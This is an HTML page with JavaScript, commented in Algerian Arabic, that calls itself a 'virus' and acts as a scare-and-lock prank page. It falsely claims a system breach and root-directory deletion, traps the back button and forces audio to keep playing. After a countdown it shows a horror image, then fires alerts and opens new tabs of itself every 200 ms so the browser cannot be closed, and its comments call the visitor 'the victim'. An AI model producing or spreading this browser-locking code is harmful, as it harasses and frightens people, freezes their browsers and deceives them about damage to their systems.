<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SYSTEM_CRITICAL_LOCK</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; }
        #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; display: none; }
        #terminal { color: #f00; text-align: center; padding-top: 40vh; font-family: monospace; font-size: 25px; }
    </style>
</head>
<body onclick="activateVirus()">

    <div id="terminal">
        <div style="animation: blink 0.2s infinite;">⚠️ SYSTEM BREACH ⚠️</div>
        <div id="count">10</div> <div style="font-size: 14px; color: #0ff;">DELETING_ROOT_DIRECTORY...</div>
    </div>

    <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
    <audio id="sfx" src="tfy-krk.mp3" preload="auto" loop></audio>

    <script>
        let seconds = 10;
        let running = false;
        const audio = document.getElementById('sfx');

        // منع زر الرجوع سواسوة
        history.pushState(null, null, location.href);
        window.onpopstate = () => history.go(1);

        // ميزة إجبار الصوت: إذا حبس عاود شعلو سواسوة
        audio.onpause = () => { if(running) audio.play(); };

        // ميزة إعادة الدخول التلقائي: كل ما يخرج الضحية نرجعوه سواسوة
        document.addEventListener("visibilitychange", () => {
            if (document.visibilityState === 'visible' && running) {
                audio.play();
                alert("⚠️ طفي كراك.. راك محبوس سواسوة!");
            }
        });

        function activateVirus() {
            if (running) return;
            running = true;
            document.documentElement.requestFullscreen().catch(() => {});
            
            let timer = setInterval(() => {
                seconds--;
                document.getElementById('count').innerText = seconds;
                if (seconds <= 0) {
                    clearInterval(timer);
                    bombardSystem();
                }
            }, 1000);
        }

        function bombardSystem() {
            document.getElementById('terminal').style.display = 'none';
            document.getElementById('horrorImg').style.display = 'block';
            audio.volume = 1.0;
            audio.play();

            // اللاق اللانهائي: فتح نوافذ جديدة لمنع إغلاق كروم سواسوة
            setInterval(() => {
                alert("طفي كراك.. النظام مات سواسوة!");
                window.open(window.location.href, '_blank'); // فتح تبويب جديد سواسوة
                if(audio.paused) audio.play();
            }, 200);
        }
    </script>
</body>
</html>
